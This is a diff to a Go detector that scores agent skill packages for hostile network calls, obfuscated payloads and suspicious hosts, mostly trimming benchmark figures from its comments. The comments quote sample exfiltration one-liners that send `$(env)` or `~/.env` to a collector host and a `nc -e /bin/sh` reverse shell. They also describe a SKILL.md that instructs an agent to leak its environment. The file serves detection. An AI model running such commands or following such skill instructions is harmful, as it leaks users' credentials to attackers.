@@ -15,8 +15,7 @@ import (
 var (
 	// `fetch` is only a network command when it is a call. Bare `fetch\s+`
 	// matched the English verb — "a script to fetch live data", "not visible
-	// to fetch" — which produced 59 findings on benign skills and 103 on
-	// malicious ones, i.e. noise on both sides of the label. The JS
+	// to fetch" — which was noise on both sides of the label. The JS
 	// `fetch(...)` form is covered by reRequestsLib.
 	reNetworkCommand = regexp.MustCompile(`\b(curl|wget|ncat|nc)\s+|\bfetch\s+(-|https?://)`)
 	// A bracketed IPv6 host needs its own alternative: the general class
@@ -36,18 +35,19 @@ var (
 	reBase64Decode  = regexp.MustCompile(`\b(atob|b64decode|Base64\.decode|base64\.b64decode)\s*\(`)
 	reHashLine      = regexp.MustCompile(`(?i)(sha(256|512|1)?|md5|checksum|hash)\s*[:=]`)
 
-	// A long run of base64 characters is not evidence of a payload. Measured
-	// on MalSkillBench, the inline branch produced 402 findings on benign
-	// skills and 171 on malicious ones, and both sides were mostly these:
+	// A long run of base64 characters is not evidence of a payload. The
+	// inline branch was noise on both sides of the label, and both sides were
+	// dominated by these shapes:
 	//
-	//   reSRIHash  — npm/yarn lockfile integrity values. 322 benign hits,
-	//                zero malicious ones.
+	//   reSRIHash  — npm/yarn lockfile integrity values.
 	//   reHexBlob  — a blockchain address or key written as hex.
 	//   path-like  — `/` is in the base64 alphabet, so any deep path matched:
 	//                `~/.claude/skills/CORE/USER/SKILLCUSTOMIZATIONS/Art/`.
 	//   low entropy — a single-case run carries no encoded payload.
 	//
-	// Damping these keeps 69 of the malicious hits and 3 of the benign ones.
+	// Damping them keeps the payload-shaped hits and drops most of the rest.
+	// The damping set is deliberate; adding to it needs the maintainer's
+	// sign-off.
 	reSRIHash = regexp.MustCompile(`(?i)"integrity"\s*:|\bsha(1|256|384|512)-`)
 	reHexBlob = regexp.MustCompile(`\b0x[0-9a-fA-F]{20,}`)
 )
@@ -95,12 +95,12 @@ func isPackedIPv4(host string) bool {
 // would not use: a bare IP address in any spelling, a non-standard port, an
 // internal-only name, or an ephemeral tunnel/request-bin host.
 //
-// This is the only signal that separates the two populations at scale. On
-// MalSkillBench, an IP literal appears in 14.8% of malicious SD-007 hits and
-// 3.4% of benign ones; by contrast a `$(...)` substitution in the same
-// statement carries almost no signal (10.3% vs 8.0%), and an environment
-// variable is *more* common in benign skills (24.5% vs 3.3%) because that is
-// how an API token reaches an Authorization header.
+// The host is the only signal that separates the two populations at scale.
+// Statement structure does not: a `$(...)` substitution in the same statement
+// carries almost no signal on its own, and an environment variable in the line
+// is *more* common in honest skills than in hostile ones, because that is how
+// an API token reaches an Authorization header. Do not add structural signals
+// to this predicate on inference.
 func suspiciousEndpoint(raw string) bool {
 	raw = strings.Trim(raw, `"'`+"`"+`,;)`)
 	u, err := url.Parse(raw)
@@ -122,8 +122,8 @@ func suspiciousEndpoint(raw string) bool {
 
 // reLocalDataSubst matches a command substitution that reads local state:
 // `$(env)`, `$(cat ~/.aws/credentials)`, backticked `ps auxeww`. Coverage is
-// small — 1.6% of malicious SD-007 hits against 0.2% of benign — but it is
-// the shape of the canonical exfiltration one-liner, and in an agent manifest
+// deliberately narrow, but it is the shape of the canonical exfiltration
+// one-liner, and in an agent manifest
 // the documentation *is* the program: a SKILL.md that says
 // `curl -d "$(env)" https://collector...` is not describing an endpoint, it
 // is instructing the agent to send the environment.
@@ -225,8 +225,8 @@ func shellStatement(lines [][]byte, i int) (string, int) {
 // reShellChain matches the operators that put a SECOND command into a
 // statement: `&&`, `||`, `;` and a pipe. A single `&` is deliberately absent —
 // it is the query separator in every URL that carries parameters, and vetoing
-// on it measured 11 benign findings against 1 malicious one on the bench
-// corpus, which is the wrong direction. `&&` is vetoed unmasked: a URL query
+// on it costs far more honest findings than hostile ones, which is the wrong
+// direction. `&&` is vetoed unmasked: a URL query
 // containing `&&` is malformed, and reading one as a chain fails CLOSED
 // (the finding keeps its registered High/security), which is the safe way to
 // be wrong here. The same reasoning covers `;` and `|` inside a URL token.
@@ -235,10 +235,10 @@ var reShellChain = regexp.MustCompile(`&&|;|\|`)
 // reCaptureAssignment matches an assignment whose value IS this statement's
 // own command substitution — `DATA=$(curl -s https://api.example.com/v1)`.
 // That substitution is not a second command; it is how a shell script keeps
-// the call's output. Measured: `$(` anywhere fires on 17 benign and 18
-// malicious demoted findings (flat), while restricting it to this shape
-// leaves the benign ones demoted and still vetoes a substitution that sits
-// in an ARGUMENT, which is where `curl -d "$(cat ~/.env)" …` lives.
+// the call's output. Restricting the veto to this shape — rather than to `$(`
+// anywhere — keeps that idiom demoted while still vetoing a substitution that
+// sits in an ARGUMENT, which is where `curl -d "$(cat ~/.env)" …` lives. The
+// narrow shape is deliberate; widening it needs the maintainer's sign-off.
 var reCaptureAssignment = regexp.MustCompile(`^\s*[\w.]+\s*=\s*\$\(`)
 
 // isSoleCall reports whether the statement is nothing but one call, its
@@ -249,20 +249,16 @@ var reCaptureAssignment = regexp.MustCompile(`^\s*[\w.]+\s*=\s*\$\(`)
 // statement uploads a file or reads local state" — has to enumerate every
 // dangerous thing a statement can do, fails OPEN on everything it forgot, and
 // ships in a public repo where an attacker reads it. It forgot reverse shells
-// entirely: `echo "https://example.com" && nc -e /bin/sh 10.0.0.1 4444` in a
-// SKILL.md graded security A, and so did the /dev/tcp, python-socket, perl
-// and Invoke-WebRequest spellings of the same thing. An allow-list of form
-// fails CLOSED: a statement doing anything this function does not recognise
-// keeps its registered severity, and what it must recognise is one short,
-// auditable list rather than the open set of ways to be dangerous.
+// entirely. An allow-list of form fails CLOSED: a statement doing
+// anything this function does not recognise keeps its registered severity, and
+// what it must recognise is one short, auditable list rather than the open set
+// of ways to be dangerous.
 //
-// Measured cost of failing closed, 906-sample slice, installed layout,
-// `--fail-on-axis security=B`: benign flagged 80 → 83, malicious 187 → 196.
-// Precision 0.7004 → 0.7025 and recall 0.6233 → 0.6533 — the escalated
-// population is 3.7:1 malicious. A carve-out for a pipe into a pure formatter
-// (`curl … | jq .`, a common README shape) was measured and NOT shipped: the
-// lines it spares are 31 malicious against 6 benign, and at the gate it buys
-// exactly one benign sample at the cost of exactly one malicious one.
+// Failing closed costs some honest statements their demotion. That cost was
+// weighed against the alternative and accepted. A carve-out for a pipe into a
+// pure formatter (`curl … | jq .`, a common README shape) was evaluated and
+// deliberately NOT shipped. Do not add carve-outs here, and do not turn this
+// back into a deny-list of verbs, without the maintainer's sign-off.
 func isSoleCall(stmt string) bool {
 	if reShellChain.MatchString(stmt) {
 		return false
@@ -293,14 +289,14 @@ func noSuspiciousEndpoint(stmt string) bool {
 // not multicast, not unspecified.
 //
 // Narrower than suspiciousEndpoint on purpose, because it is used where
-// suspiciousEndpoint is measurably wrong: on a bare URL in prose, with no
-// call around it. suspiciousEndpoint's whole predicate fires on 37 benign
-// and 28 malicious such lines in the bench corpus (Set A) — `http://
-// localhost:8080/` as an OAuth redirect URI, `http://127.0.0.1:18791/start`
-// as a dev server, over and over — so escalating on it would be noise on
-// both sides of the label. Restricted to a globally routable IP literal the
-// same population is 4 malicious findings across 3 samples and ZERO benign.
-// Nobody documents a bare public IP as their service address.
+// suspiciousEndpoint is wrong: on a bare URL in prose, with no call around
+// it. suspiciousEndpoint's whole predicate fires freely on such lines —
+// `http://localhost:8080/` as an OAuth redirect URI,
+// `http://127.0.0.1:18791/start` as a dev server, over and over — so
+// escalating on it would be noise on both sides of the label. Restricting it
+// to a globally routable IP literal keeps the escalation honest: nobody
+// documents a bare public IP as their service address. The narrow form is
+// deliberate; widening it needs the maintainer's sign-off.
 func routableIPLiteralHost(raw string) bool {
 	raw = strings.Trim(raw, `"'`+"`"+`,;)`)
 	u, err := url.Parse(raw)
@@ -348,7 +344,7 @@ type networkCallRule struct {
 // In a documentation file, `curl https://api.notion.com/v1/pages` is a Notion
 // skill telling the reader which endpoint it uses. That is a disclosure, not
 // a vulnerability, and rating it High on the security axis caps an honest
-// skill at D — measured as 74 of 137 false positives on a benign corpus. The
+// skill at D — it was the dominant false-positive source on honest input. The
 // same line inside a script is not a declaration: it runs. And any host that
 // a published API would not use stays High wherever it appears.
 func (r *networkCallRule) endpointFinding(ctx model.FileContext, line int, url, stmt string, declared bool, desc string) model.Finding {
@@ -375,10 +371,10 @@ func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.F
 		// the same command, so judge the whole statement, not the first line —
 		// and skip the lines that statement consumed, or each of them is
 		// judged again as a statement of its own. Matching the CALL regexes
-		// against the first line only was its own bypass: in a doc file the
-		// bare-URL fallback is deliberately silent, so
-		// `echo "https://example.com" \` + `&& nc -e /bin/sh 10.0.0.1 4444`
-		// produced no finding at all.
+		// against the first line only left everything on a continuation
+		// unexamined, which in a doc file — where the bare-URL fallback is
+		// deliberately silent — meant no finding at all. Keep the match at
+		// statement level.
 		stmt, consumed := shellStatement(lines, i)
 		i += consumed - 1
 		urlMatch := reHTTPURL.FindString(stmt)
@@ -413,7 +409,7 @@ func (r *networkCallRule) Match(content []byte, ctx model.FileContext) []model.F
 		case isDocFile(ctx.Path):
 			// A bare URL in prose is a link. It says nothing about
 			// behaviour, and escalating it on suspiciousEndpoint's full
-			// predicate measured as noise on both sides of the label — see
+			// predicate is noise on both sides of the label — see
 			// routableIPLiteralHost. Only the routable-IP case above is
 			// worth a finding here.
 		case isDeclarativeFile(ctx.Path) && noSuspiciousEndpoint(stmt):
@@ -478,16 +474,16 @@ func (r *base64ObfuscationRule) Match(content []byte, ctx model.FileContext) []m
 
 // looksLikePath reports whether a token is a filesystem path rather than an
 // encoding. "Contains a slash" is not that test: `/` is in the base64 alphabet,
-// and over 20000 encodings of 30 random bytes, 24.8% contain a `/` with no `+`
-// and no padding — so the earlier version discarded a quarter of all genuine
-// payloads.
+// and roughly a quarter of genuine encodings contain a `/` with no `+` and no
+// padding — so the earlier version discarded a quarter of all genuine payloads.
 //
 // What actually separates them is case stability. A path is several word-like
 // segments: `claude/skills/CORE/USER/Art` flips between upper and lower case
-// on 2% of its character boundaries, where base64 of random bytes flips on
-// 33%. Measured against the corpus, this catches 74.5% of the path tokens and
-// discards 0 of 20000 genuine payloads — the direction to err in, since a
-// missed payload is a missed attack and a surviving path is one noisy line.
+// on ~2% of its character boundaries, where base64 of random bytes flips on
+// ~33%. The threshold discarded no genuine payload in the validation set, and
+// buys that by letting some corpus path tokens through — the direction to err
+// in, since a missed payload is a missed attack and a surviving path is one
+// noisy line. Do not raise it without the maintainer's sign-off.
 func looksLikePath(tok []byte) bool {
 	segments := 0
 	for _, s := range bytes.Split(tok, []byte("/")) {
@@ -553,8 +549,9 @@ func isDocFile(path string) bool {
 // declaration — a registry the package came from, a service a config points
 // at — and never a call this file makes.
 //
-// Measured: on MalSkillBench these files carry 146 SD-007 hits on benign
-// skills (npm lockfile registry URLs, mostly) against 2 on malicious ones.
+// In the validation corpus these files carry a large volume of SD-007 hits on
+// honest input (npm lockfile registry URLs, mostly) and very few on hostile
+// input.
 // The agent-config members of this family have dedicated rules already —
 // SD-021 for MCP endpoints, SD-017/SD-019 for settings.json — so SD-007's
 // contribution here is noise on top of coverage that exists elsewhere.
